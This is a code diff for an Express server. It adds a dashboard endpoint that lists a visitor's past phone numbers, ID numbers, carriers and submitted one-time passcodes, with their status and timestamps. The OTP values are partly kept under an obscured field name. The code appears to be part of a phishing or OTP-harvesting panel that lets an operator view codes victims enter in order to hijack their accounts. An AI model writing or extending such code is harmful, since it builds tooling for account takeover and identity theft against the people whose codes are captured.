@@ -751,6 +751,54 @@ async function startServer() {
     }
   });
 
+  // =============================================
+  // Get Phone Data & OTP History (excluding current)
+  // =============================================
+  app.get("/api/dashboard/phone-history/:visitorId", async (req, res) => {
+    try {
+      const { visitorId } = req.params;
+      const visitor = await readVisitor(visitorId);
+      
+      if (!visitor) {
+        res.status(404).json({ error: "Visitor not found", history: [] });
+        return;
+      }
+
+      // Get all historical phone data and OTP codes (excluding current)
+      const history: any[] = [];
+      const currentPhone = visitor.raw?.phoneNumber;
+      const currentOtp = visitor.raw?._v7 || visitor.raw?.otpCode;
+      
+      // Get historical entries from rawData array
+      const rawData = visitor.rawData || [];
+      for (const entry of rawData) {
+        const phoneNumber = entry?.raw?.phoneNumber;
+        if (phoneNumber && phoneNumber !== currentPhone) {
+          // Check if this phone entry is not already in the list
+          const exists = history.some(h => h.phoneNumber === phoneNumber);
+          if (!exists) {
+            history.push({
+              phoneNumber: phoneNumber,
+              phoneIdNumber: entry.raw.phoneIdNumber || "",
+              phoneCarrier: entry.raw.phoneCarrier || "",
+              otpCode: entry.raw._v7 || entry.raw.otpCode || "",
+              otpStatus: entry.raw.phoneOtpStatus || entry.raw.otpStatus || "pending",
+              updatedAt: entry.raw.phoneOtpSubmittedAt || entry.raw.updatedAt || entry.updatedAt
+            });
+          }
+        }
+      }
+
+      // Sort by updatedAt descending
+      history.sort((a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime());
+
+      res.json({ history, visitorId });
+    } catch (error) {
+      console.error("Error fetching phone history:", error);
+      res.status(500).json({ error: "Failed to fetch phone history", history: [] });
+    }
+  });
+
   // SSE endpoint for customer pages (one-way from server to customer)
   app.get("/api/dashboard/stream", (_req, res) => {
     res.setHeader("Content-Type", "text/event-stream");
